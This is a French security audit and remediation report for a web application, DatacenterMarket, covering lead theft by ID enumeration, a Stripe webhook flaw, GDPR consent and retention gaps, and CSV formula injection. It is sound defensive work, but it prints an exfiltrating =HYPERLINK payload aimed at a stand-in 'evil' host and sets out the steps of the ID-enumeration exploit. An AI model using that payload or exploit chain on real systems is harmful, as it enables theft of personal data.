# Rapport d'audit sécurité & correction — DatacenterMarket

*Date : 2026-07-12 · Cible : branche `main` · Périmètre : code applicatif + plomberie `server/_core/**`.*
*Méthode : 6 auditeurs parallèles par dimension → chaque constat contre-vérifié de façon adversariale → relecture manuelle indépendante des constats porteurs.*

> **✅ RÉSOLUTION (2026-07-12).** Les 11 constats ci-dessous ont été **corrigés** dans la foulée de l'audit.
> Vérification : `tsc --noEmit` clean · **128 tests verts** (nouveaux tests de non-régression pour chaque
> correctif) · build prod + prérendu OK. **Action requise avant déploiement :** appliquer la migration
> `drizzle/0004_true_omega_sentinel.sql` (colonnes `consentedAt` / `consentPolicyVersion`) via `pnpm db:push`.
>
> Points d'architecture introduits :
> - **#1** — jeton de revendication signé HMAC (`server/leadClaim.ts`) émis par `leads.create` et exigé
>   pour commander (`orders.create`/`checkout`) ou matcher (`offers.match`) un lead anonyme ; le client le
>   transmet via `localStorage` (`client/src/lib/leadClaim.ts`), jamais dans l'URL.
> - **#2** — `applyStripeEvent` n'agit que sur `session.payment_status === "paid"` (ou `no_payment_required`)
>   et gère désormais `checkout.session.async_payment_succeeded` / `async_payment_failed`.
> - **#3** — `consent: z.literal(true)` obligatoire côté serveur + preuve horodatée persistée.

## 1. Verdict

La base est **bien construite** : pricing calculé côté serveur, écritures admin derrière `adminProcedure`,
idempotence du webhook Stripe, rate-limit sur `req.ip` (jamais `X-Forwarded-For` en direct), OAuth
state+nonce, lecture owner-or-admin, `path-to-regexp` correctement épinglé en 0.1.x, Dockerfile non-root,
aucun secret commité. `tsc` passe ; 110/110 tests verts (le seul « échec » observé est un flake de
timeout au démarrage à froid, cf. §5).

**Deux défauts bloquent une mise en production** :

1. **HIGH — Vol de leads anonymes / fuite de PII** par énumération d'ID (`server/routers.ts:84`).
2. **HIGH (latent) — Webhook Stripe** qui traite « payé » sans vérifier `payment_status`
   (`server/stripe.ts:110`) — se déclenche dès qu'un moyen de paiement à débit différé est activé.

À corriger juste après : consentement RGPD non stocké, purge de rétention trop étroite, injection CSV.

## 2. Constats (classés par sévérité)

| # | Sévérité | Domaine | Emplacement | Constat |
|---|----------|---------|-------------|---------|
| 1 | **HIGH** | Autorisation / PII | `server/routers.ts:84` | Tout compte authentifié peut revendiquer un lead anonyme par ID, lire ses PII et le voler à son créateur |
| 2 | **HIGH** (latent) | Paiement | `server/stripe.ts:110` | Webhook marque « payé » sans lire `session.payment_status` → provisioning/CA sur paiements différés non encaissés |
| 3 | **MEDIUM** | RGPD | `server/routers.ts:168`, `client/src/pages/WorkloadForm.tsx:194` | Consentement contrôlé uniquement côté client, jamais transmis ni stocké → aucune preuve (Art. 7-1) |
| 4 | **MEDIUM** | RGPD | `server/db.ts:151` | La purge ne supprime jamais les leads `offered`/`qualified` ni ceux liés à une commande annulée → PII conservées indéfiniment |
| 5 | **MEDIUM** | Injection | `shared/csv.ts:11` | Injection de formules CSV : champs de lead non neutralisés (`= + - @`) dans l'export admin |
| 6 | LOW | Cohérence | `server/routers.ts:379` | `updatePaymentStatus` réécrit `status` à `pending` pour tout paiement non-`succeeded` |
| 7 | LOW | DoS | `server/routers.ts:309` | `orders.create` non rate-limité, ~8 écritures DB/appel (endpoint non utilisé par le client) |
| 8 | LOW | PII (inférence) | `server/routers.ts:281` | `offers.match` public permet d'inférer le besoin GPU d'un lead par énumération d'ID |
| 9 | LOW | PII (logs) | `server/_core/email.ts:27` | Le transport email par défaut (no-op) journalise l'email client en clair |
| 10 | LOW | Config | `server/_core/redisRateLimit.ts:20` | Membre ZSET non unique par hit → sous-comptage des rafales dans la même ms |
| 11 | LOW | Infra | `.github/workflows/crons.yml:22` | Jobs RGPD destructifs depuis runners GitHub avec secret `DATABASE_URL` long-terme |

## 3. HIGH — scénario & correctif

### #1 — Vol de lead anonyme par énumération d'ID (`server/routers.ts:84`)

Le funnel tourne avant login : `leads.create` est `publicProcedure` et stocke `userId = ctx.user?.id`,
donc `null` pour un visiteur non connecté (`drizzle/schema.ts:33`, colonne nullable). Le garde de
`createPendingOrder` :

```ts
if (!lead || (lead.userId != null && lead.userId !== userId)) { … }  // ligne 84
```

ne se déclenche jamais quand `lead.userId` est `null` : le terme `lead.userId != null` court-circuite le
contrôle de propriété. Conséquence, chaîne d'exploitation :

1. L'attaquant (n'importe quel compte OAuth) appelle `orders.create({ leadId: N, offerId })` avec un
   `offerId` public issu de `offers.list`.
2. Le lead #N est **revendiqué** : `userId: lead.userId ?? userId` (lignes 123-127) l'attribue à l'attaquant.
3. L'attaquant appelle `leads.get({ id: N })` — désormais propriétaire, il reçoit email, société,
   nom/rôle de contact, budget et contraintes.
4. En bouclant `N = 1..max` (IDs auto-incrémentés séquentiels), il **aspire les PII de tous les leads
   anonymes** et **verrouille chaque créateur légitime** (leur revendication ultérieure renvoie `NOT_FOUND`).

Aggravant : `orders.create` n'est pas rate-limité (contrairement à `orders.checkout`).

**Correctif** — lier la revendication à une preuve, au choix :
- jeton de revendication signé émis au créateur anonyme dans `leads.create`, exigé dans `orders.create`/`checkout` ; ou
- mémoriser le `leadId` en attente dans la **session** et n'autoriser que celui-là ; ou
- exiger une correspondance sur l'email vérifié de l'utilisateur.

À défaut minimal : ne pas exposer les PII via `leads.get` tant que la propriété n'est pas prouvée, et
poser un rate-limit sur `orders.create`.

### #2 — Webhook Stripe : « payé » sans vérifier `payment_status` (`server/stripe.ts:110`)

`applyStripeEvent` ne teste que `event.type === "checkout.session.completed"` puis passe la commande à
`paymentStatus="succeeded"` / `status="processing"` (lignes 130-134), marque le lead `converted`
(ligne 137), lance la timeline de provisioning et l'email — **sans jamais lire `session.payment_status`**.
En mode `subscription` (ligne 86) avec un moyen à débit différé (prélèvement SEPA…), Stripe émet
`checkout.session.completed` immédiatement avec `payment_status="unpaid"`. Les événements
`checkout.session.async_payment_succeeded` / `async_payment_failed` ne sont jamais traités : aucune
réconciliation. Si le débit échoue ensuite, l'infra reste provisionnée et `admin.stats` compte un CA jamais
encaissé. C'est exactement l'« unverified assumption » de `CLAUDE.md` / `DEPLOYMENT.md §10`.

*Portée :* le flux **carte** synchrone par défaut renvoie `payment_status="paid"` et fonctionne ; le bug
ne mord que si un moyen de paiement différé est activé sur le compte Stripe → **latent mais bloquant à
activer avant d'ouvrir SEPA/virement.**

**Correctif** — dans `applyStripeEvent` :
1. Ne basculer en `succeeded` que si `session.payment_status === "paid"` (ou `"no_payment_required"`
   uniquement si des offres gratuites sont voulues).
2. Gérer `checkout.session.async_payment_succeeded` (→ `succeeded`) et `async_payment_failed`
   (→ `failed` + annulation du provisioning).
3. Recommandé : recouper `session.amount_total` / `currency` avec la commande avant de valider.

## 4. MEDIUM / LOW

**#3 — Consentement RGPD non persisté** (`routers.ts:168`, `WorkloadForm.tsx:194`). La case n'existe qu'en
état React ; jamais envoyée dans `leads.create`, aucun champ `consent` dans le schéma Zod, aucune colonne
en base. Un POST direct crée un lead sans consentement, et même via l'UI aucune preuve (flag/horodatage/
version de politique) n'est stockée. *Fix :* `consent: z.literal(true)` au schéma + colonnes
`consentedAt`/version dans `drizzle/schema.ts`, persistées par `createLead`.

**#4 — Rétention trop étroite** (`db.ts:151`). `purgeLeadsOlderThan` ne supprime que `new`/`rejected` **et**
non référencés — or `referencedLeadIds` inclut les commandes *annulées*. Un prospect qui démarre un
checkout passe en `offered` + crée une commande (annulée ensuite par `db:cancel-stale`) : doublement exclu,
PII conservées indéfiniment malgré la politique 24 mois affichée. *Fix :* purger aussi les `offered`/
`qualified` dont les seules commandes sont annulées ; ne calculer `referencedLeadIds` que sur les commandes
non annulées.

**#5 — Injection de formules CSV** (`shared/csv.ts:11`). `escapeCsvField` ne quote que sur `[",\r\n]` et ne
neutralise pas `= + - @`. Un lead anonyme avec `company = =HYPERLINK("https://evil/?x="&A2,"x")` s'exécute
à l'ouverture de l'export dans Excel/Sheets. *Fix :* préfixer d'une apostrophe (et forcer le quoting) toute
valeur débutant par `= + - @`, tab ou CR.

**#6 — `updatePaymentStatus` écrase le cycle de vie** (`routers.ts:379`). `status` dérivé
inconditionnellement de `paymentStatus` : enregistrer un `failed`/`cancelled` (chargeback) sur une commande
`active`/`completed` la réinitialise à `pending`. Admin-only, réparable, mais régression d'état réelle.
*Fix :* n'avancer `pending→processing` que sur `succeeded`, laisser `status` intact sinon.

**#7 — `orders.create` non rate-limité** (`routers.ts:309`). ~8 écritures DB/appel sans throttle. Endpoint
**non utilisé par le client** (seul `checkout` l'est). *Fix :* même rate-limit, ou supprimer l'endpoint.

**#8 — `offers.match` fuit le besoin GPU d'un lead** (`routers.ts:281`). `publicProcedure` qui déréférence un
lead par ID et filtre le catalogue par son `gpuRequirement` : les offres renvoyées révèlent ce besoin.
Contradiction avec la posture owner-or-admin de `leads.get`. *Fix :* exiger owner-or-admin quand `leadId`
est fourni, ou prendre les critères en entrée explicite.

**#9 — Email client en clair dans les logs** (`_core/email.ts:27`). Transport no-op par défaut :
`console.log(… to ${message.to})` à chaque confirmation/alerte. PII hors périmètre `db:purge`. *Fix :*
masquer l'adresse.

**#10 — Membre ZSET non unique** (`_core/redisRateLimit.ts:20`). `${now}-${Math.round(now % 1000)}-${key.length}`
est entièrement déterminé par `now` (le commentaire affirme à tort l'unicité) : deux hits dans la même ms
produisent le même membre, `ZADD` met à jour le score au lieu d'insérer, `ZCARD` les compte pour 1 →
limiteur affaibli en multi-instance. *Fix :* suffixe réellement unique par hit (compteur/UUID), `now` restant
le score.

**#11 — Crons RGPD depuis GitHub Actions** (`.github/workflows/crons.yml:22`). `db:purge` (suppression
définitive) + `db:cancel-stale` sur runners GitHub avec `DATABASE_URL` delete-capable. Pas de risque
fork-PR (triggers `schedule`/`workflow_dispatch`). Pire cas (DB ouverte aux IP GitHub) dépend d'une config
réseau externe non présente dans le repo. *Fix (hygiène) :* exécuter depuis le réseau du déploiement
(cron hôte / self-hosted runner) et restreindre l'ingress DB.

## 5. Vérifié « propre » & lacunes hors-code

**Solide :** pricing serveur (`createPendingOrder`), idempotence webhook (retour anticipé si déjà
`succeeded`), écritures admin derrière `adminProcedure`, rate-limit sur `req.ip` + `trust proxy`, lecture
owner-or-admin (`requireOwnedOrder`, contrôle PII de `leads.get`), auth du flux SSE + nettoyage sur
`res.close`, clé télémétrie comparée en temps constant, override `path-to-regexp` en 0.1.x, Dockerfile
non-root multi-stage, aucun secret commité, rendu markdown du chat via Streamdown + dompurify patché.

**Baseline :** `tsc --noEmit` clean. Suite de tests 110/110 verte **avec un timeout adéquat** — l'unique
échec observé (`server/telemetry.test.ts`, 1er test) est un **flake de démarrage à froid** : la phase
d'import a pris 92 s sur cette machine et a dépassé le `testTimeout` de 5 s ; relancé, il passe 7/7.
Envisager de relever `testTimeout` (ou un warm-up) pour fiabiliser la CI sur runners froids.

**Lacunes nécessitant un apport externe (pas des bugs de code) :** Stripe live (clés — corriger #2 avant
d'activer un paiement différé) ; télémétrie GPU/CPU (`TELEMETRY_INGEST_KEY` + agent provider) ; Sentry
(`SENTRY_DSN`) ; base de prod cloud avec ingress réseau restreint (cf. #11).

**Priorité :** #1 puis #2 avant toute mise en production ; enchaîner #3–#5.
